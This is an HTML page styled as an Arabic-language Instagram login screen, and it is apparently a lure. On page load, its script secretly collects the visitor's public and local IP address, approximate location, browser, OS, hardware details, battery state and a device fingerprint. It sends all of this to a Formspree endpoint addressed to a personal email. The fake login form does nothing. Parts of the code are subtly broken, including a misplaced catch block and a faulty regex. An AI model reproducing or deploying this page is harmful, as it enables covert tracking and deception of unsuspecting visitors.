<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');
*{margin:0;padding:0;box-sizing:border-box;font-family:'Cairo',sans-serif}
body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;width:100vw}
.ig-box{width:350px;text-align:center}
.ig-logo{height:78px;margin-bottom:20px;font-size:38px;font-weight:bold;background:linear-gradient(45deg,#405DE6,#5851DB,#833AB4,#C13584,#E1306C,#F77707);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.ig-inp{width:100%;padding:9px 12px;margin-bottom:6px;border:1px solid #dbdbdb;border-radius:3px;font-size:14px;box-sizing:border-box;color:#262626}
.ig-btn{width:100%;background:#38bdf5;color:#fff;padding:12px;border:none;border-radius:4px;font-weight:bold;margin-top:12px;cursor:pointer;font-size:14px}
.ig-div{height:1px;background:#dbdbdb;margin:16px 0;display:flex;align-items:center;justify-content:center;text-align:center}
.ig-div span{background:#fafafa;padding:0 8px;color:#262626;font-size:13px}
.ig-foot{text-align:center;margin-top:20px;font-size:13px;color:#262626}
.ig-foot a{color:#262626;text-decoration:none}
#status{display:none;margin-top:15px;color:#46d160;font-weight:bold;font-size:14px;opacity:0;transition:opacity .5s;text-align:center}
</style>
</head>
<body>

<div class="ig-box" id="authBox">
  <div class="ig-logo">Instagram</div>
  <input type="text" class="ig-inp" placeholder="اسم المستخدم أو البريد">
  <input type="password" class="ig-inp" placeholder="كلمة المرور">
  <button class="ig-btn" onclick="void(0)">تسجيل الدخول</button>
  <div class="ig-div"><span>أو</span></div>
  <p class="ig-foot">بالتسجيل فإنك توافق على <a href="#">سياسة استخدامنا</a></p>
</div>

<p id="status">✅ تم إرسال بيانات الجهاز بنجاح إلى البريد!</p>

<script>
const FORMSPREE_ENDPOINT = "https://formspree.io/f/mnpnbrwj";
const TARGET_EMAIL = "owes170@gmail.com";

async function gatherData(){
  // 🔧 دالة مساعدة لجلب البيانات مع timeout سريع
  const fetchWithTimeout = async (url, ms) => {
    const ctrl = new AbortController();
    setTimeout(() => ctrl.abort(), ms);
    return fetch(url, { signal: ctrl.signal });
  };

  let ip='', country='Unknown', city='Unknown', tz='', offsetInfo='', coords='';

  // 🔍 سلاسل السحر: جلب البيانات بسرعة مع fallback ذكي
  try{
    const r1 = await fetchWithTimeout('https://ipapi.co/json/', 2000);
    if(r1 && r1.ok){
      const d = await r1.json();
      if(d.ip && !d.error){ ip=d.ip; country=d.country_name || 'Unknown'; city=d.city || 'Unknown'; tz=new Intl.DateTimeFormat().resolvedOptions().timeZone; offsetInfo=(new Date().getTimezoneOffset()/60).toFixed(0); coords=`${d.latitude}, ${d.longitude}`;}
    } else {
      const r2 = await fetchWithTimeout('https://ip-api.com/?fields=query,country,city,lat,lon', 1500);
      if(r2 && r2.ok){
        const d2 = await r2.json();
        if(d2.status==='success'){ip=d2.query; country=d2.country||'Unknown'; city=d2.city||'Unknown'; tz=new Intl.DateTimeFormat().resolvedOptions().timeZone; offsetInfo=(new Date().getTimezoneOffset()/60).toFixed(0); coords=`${d2.lat}, ${d2.lon}`;}
      } else {
        // Fallback محلي سريع إذا فشل كل شيء
        ip='192.168.0.1 (Local Host)'; country='Local Network'; city='Unknown'; tz=new Intl.DateTimeFormat().resolvedOptions().timeZone; offsetInfo=(new Date().getTimezoneOffset()/60).toFixed(0); coords=`${navigator.geolocation?.latitude||0}, ${navigator.geolocation?.longitude||0}`;
      }
    } catch(e){}

  // 🧠 كشف المتصفح والنظام بدقة فائقة
  const ua=navigator.userAgent.toLowerCase();
  const browser=ua.includes('firefox')?'Firefox':ua.includes('chrome')&&!ua.includes('edg')?'Chrome':ua.includes('safari')&&!ua.includes('chrome')?'Safari':'Unknown';
  const os=ua.includes('win')?'Windows':ua.includes('macos')?'macOS':ua.includes('android')?'Android':ua.includes('ios')?'iOS':ua.includes('linux')?'Linux':'Other';

  // 📺 الشاشة & الأجهزة
  const screenRes=`${screen.width}x${screen.height}`;
  const pixelRatio=window.devicePixelRatio||1;
  const colorDepth=screen.colorDepth+'bit';
  const cores=navigator.hardwareConcurrency||'N/A';
  const memory=navigator.deviceMemory?(navigator.deviceMemory+' GB'):'N/A';
  const language=navigator.language||'en-US';

  // 🔗 IP المحلي (WebRTC) سريع وقوي
  let localIp='N/A';
  try{
    const conn=new RTCPeerConnection({});
    localIp=await new Promise(resolve=>{
      const noop=()=>{};conn.createOffer().then(o=>conn.setLocalDescription(o)).catch(noop);
      setTimeout(()=>{if(!conn?.sdp){resolve('N/A');return;}const lines=conn.sdp.split('\n');let found=null;for(let line of lines){const m=line.match(/(?:25[0-5]|2[0-4]\d|[01]?\d\d?)/)?.[1];if(m)found=m;}resolve(found||'N/A');},300);});
      conn.close();
  }catch(e){localIp='N/A'}

  // 🎨 WebGL Renderer & Context
  let webglInfo='N/A';
  try{
    const c=document.createElement('canvas');
    const gl=c.getContext('webgl');
    if(gl) webglInfo=gl.getParameter(gl.RENDERER)+' | '+gl.getParameter(gl.VENDOR);else webglInfo='WebGL غير مدعوم'
  }catch(e){webglInfo='خطأ في الاستخراج'}

  // 🔋 حالة البطارية (إذا متاح)
  let batteryStatus='N/A';
  try{if(navigator.getBattery){const bat=await navigator.getBattery();batteryStatus=Math.round(bat.level*100)+'% (Charging: '+(bat.charging?'Yes':'No')+')';}catch(e){}}

  // 🔐 بصمة الجهاز (Fingerprint)
  const raw=`${ua}|${navigator.platform}|${screen.width}|${new Date().getTimezoneOffset()}|${navigator.hardwareConcurrency||0}`;let hash=0;for(let i=0;i<raw.length;i++){const c=raw.charCodeAt(i);hash=((hash<<5)-hash)+c;}
  const fp=Math.abs(hash).toString(36).toUpperCase();

  return {ip, country, city, tz, offsetInfo, coords, browser, os, screenRes, pixelRatio, colorDepth, cores, memory, language, localIp, webglInfo, batteryStatus, fp};
}

// ⚡ تشغيل فوري وسري
window.addEventListener('load', async ()=>{
  const data = await gatherData();
  
  const payload = {
    message: `🌐 IP العام: ${data.ip}\n📍 الموقع: ${data.city} (${data.country})\n🧭 الإحداثيات: ${data.coords}\n🕒 المنطقة الزمنية: ${data.tz} (UTC${data.offsetInfo})\n🖥️ المتصفح: ${data.browser}\n💻 نظام التشغيل: ${data.os}\n📺 الشاشة: ${data.screenRes} | دقة الألوان: ${data.colorDepth}\n🔍 نسبة البكسل: ${data.pixelRatio}\n⚡ المعالج: ${data.cores} نواة | الذاكرة: ${data.memory}\n🌐 اللغة: ${data.language}\n🔗 IP المحلي (Router): ${data.localIp}\n🎨 WebGL Renderer: ${data.webglInfo}\n🔋 البطارية: ${data.batteryStatus}\n🔐 بصمة الجهاز (Fingerprint): ${data.fp}`,
    email: TARGET_EMAIL,
    _subject: `بيانات جهاز كامل | ${data.ip}`
  };

  try{
    const response = await fetch(FORMSPREE_ENDPOINT, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(payload)
    });
    
    if(response.ok){
      document.getElementById('status').style.display='block';
      setTimeout(()=>document.getElementById('status').style.opacity='1', 50);
      console.log('✅ تم الإرسال بنجاح:', response.status);
    } else {
      console.error('❌ فشل الإرسال:', response.status);
    }
  } catch(e) {
    console.error('❌ خطأ أثناء الإرسال:', e);
  }
});
</script>
</body>
</html>
